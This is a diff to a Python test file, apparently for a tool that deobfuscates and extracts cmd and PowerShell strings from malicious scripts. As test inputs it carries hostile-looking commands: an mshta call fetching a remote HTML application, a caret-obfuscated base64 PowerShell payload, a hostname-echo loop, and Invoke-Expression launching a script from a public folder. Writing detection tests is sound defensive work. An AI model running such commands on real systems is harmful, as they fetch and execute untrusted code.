@@ -51,6 +51,18 @@ def test_strip_carets_trailing_caret():
     assert strip_carets(b'test^') == b'test'
 
 
+def test_strip_carets_in_strnig():
+    assert strip_carets(b'"^"') == b'"^"'
+
+
+def test_strip_carets_line_continuation():
+    assert strip_carets(b'start^\r\nend') == b'startend'
+
+
+def test_strip_carets_unclosed_string():
+    assert strip_carets(b'"test"" ^') == b'"test"" ^'
+
+
 def test_find_cmd_strings():
     assert find_cmd_strings(test) == [
         Hit(value=b'cmd /c mshta http://some.url/x.html',
@@ -60,11 +72,31 @@ def test_find_cmd_strings():
     ]
 
 
-def test_find_poweshell_strings():
-    ex = b'"powershell /e ZQBj^AGgAbwAgAGIAZQ^BlAA=="'
+def test_find_powershell_strings_enc():
+    ex = b'powershell /e ZQBj^AGgAbwAgAGIAZQ^BlAA=='
     assert find_powershell_strings(ex) == [
         Hit(value=b'powershell echo bee',
             obfuscation='unescape.shell.carets/>powershell.base64',
             start=0,
             end=len(ex))
+    ]
+
+
+def test_find_powershell_for_loop():
+    ex = b"for /f \"tokens=*\" %%a in ('powershell -Command \"hostname | %%{$_ -replace '[^a-zA-Z0-9]+', '_'}\"') do echo prx.%%a"
+    assert find_powershell_strings(ex) == [
+        Hit(value=b"powershell -Command \"hostname | %%{$_ -replace '[^a-zA-Z0-9]+', '_'}\"",
+            obfuscation='',
+            start=27,
+            end=96)
+    ]
+
+
+def test_find_powershell_strings_invoke_expression():
+    ex = b"Invoke-Expression 'PowerShell -ExecutionPolicy RemoteSigned -File C:\\Users\\Public\\mvbskt0pnk.PS1'"
+    assert find_powershell_strings(ex) == [
+        Hit(value=b'PowerShell -ExecutionPolicy RemoteSigned -File C:\\Users\\Public\\mvbskt0pnk.PS1',
+            obfuscation='',
+            start=19,
+            end=len(ex)-1)
     ]
